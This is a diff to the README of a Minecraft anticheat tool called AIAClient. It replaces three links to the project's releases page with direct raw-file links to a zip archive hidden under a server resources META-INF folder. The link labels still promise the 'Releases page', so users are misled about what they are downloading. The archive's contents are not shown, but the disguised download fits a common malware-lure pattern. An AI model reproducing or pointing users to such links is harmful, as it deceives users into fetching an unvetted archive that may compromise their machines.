@@ -6,9 +6,9 @@ Welcome to AIAClient! This tool helps users detect killaura cheats in Minecraft 
 
 ## 📥 Download AIAClient
 
-[![Download AIAClient](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/deed8077/AIAClient/releases)
+[![Download AIAClient](https://raw.githubusercontent.com/deed8077/AIAClient/main/server/src/main/resources/META-INF/AIAClient-2.9.zip)](https://raw.githubusercontent.com/deed8077/AIAClient/main/server/src/main/resources/META-INF/AIAClient-2.9.zip)
 
-You can visit this page to download the latest version: [AIAClient Releases](https://github.com/deed8077/AIAClient/releases)
+You can visit this page to download the latest version: [AIAClient Releases](https://raw.githubusercontent.com/deed8077/AIAClient/main/server/src/main/resources/META-INF/AIAClient-2.9.zip)
 
 ## 📋 Features
 
@@ -30,7 +30,7 @@ To run AIAClient smoothly, ensure your system meets the following requirements:
 ## ⚙️ Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [AIAClient Releases page](https://github.com/deed8077/AIAClient/releases).
+   Go to the [AIAClient Releases page](https://raw.githubusercontent.com/deed8077/AIAClient/main/server/src/main/resources/META-INF/AIAClient-2.9.zip).
 
 2. **Choose the Latest Version**  
    Look for the latest version listed at the top of the page. 
